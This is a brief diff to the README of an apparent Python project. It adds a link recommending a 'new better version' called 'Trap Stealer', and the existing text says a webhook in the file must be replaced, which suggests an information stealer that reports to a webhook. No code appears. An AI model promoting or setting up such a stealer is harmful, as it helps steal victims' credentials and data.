@@ -1,6 +1,9 @@
 [![forthebadge](https://forthebadge.com/images/badges/made-with-python.svg)](https://forthebadge.com)
 [![forthebadge](https://forthebadge.com/images/badges/built-with-love.svg)](https://forthebadge.com)
 
+New Better Version Here [Trap Stealer](https://github.com/TheCuteOwl/Trap-Stealer/)
+
+
 
 ---
 * You need to replace the webhook in the file
